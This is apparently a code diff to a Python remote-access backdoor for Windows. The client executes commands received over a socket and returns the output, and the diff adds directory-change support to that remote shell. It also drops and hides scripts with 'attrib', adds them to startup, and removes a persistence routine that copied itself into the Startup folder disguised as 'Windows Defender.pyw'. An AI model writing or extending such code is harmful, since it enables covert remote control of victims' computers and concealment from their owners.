@@ -1,7 +1,7 @@
 import socket
 from subprocess import check_output, CalledProcessError
 from pickle import dumps
-from os import getlogin, getenv, startfile, system, chdir
+from os import getlogin, getenv, startfile, system, chdir, getcwd
 
 
 class Socket:
@@ -34,6 +34,7 @@ class Socket:
         startup = False
         hide_file = False
 
+        # Check for batch script
         if "-batch" in cmd:
 
             if "-e" in cmd:
@@ -50,16 +51,26 @@ class Socket:
             drop_and_execute(cmd, execute_file=execute, startup=startup, low_protect=hide_file)
 
         else:
+
+            # Change working directory stuff
+            if "cd" in cmd[0:2]:
+                path = getcwd() + "\\" + cmd[3:]
+                try:
+                    chdir(path)
+                except (FileNotFoundError, OSError) as error:
+                    self.send_msg(error)
+                    return
+                self.send_msg(f"Changed directory to {path}")
+                return
+
+            # Normal cmd command stuff
             try:
                 output = check_output(cmd, shell=True)
                 output = ''.join(chr(i) for i in output)
             except CalledProcessError as error:
                 output = error
-            try:
-                self.send_msg(output)
-            except(ConnectionResetError, ConnectionAbortedError, OSError):
-                self.established = False
-                return
+            self.send_msg(output)
+            return
 
     def send_msg(self, msg):
         try:
@@ -103,15 +114,6 @@ def drop_and_execute(script, execute_file=False, startup=False, low_protect=Fals
         system("attrib +h +r " + file_name)
 
 
-def copy_to_startup(file_name):
-    startup_path = "C:\\Users\\" + getlogin() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
-    with open(__file__, "rb")as file:
-        file_bytes = file.read()
-    with open(startup_path + file_name, "wb")as file:
-        file.write(file_bytes)
-
-
-# copy_to_startup("Windows Defender.pyw")
 connection = Socket()
 while True:
     if not connection.established:
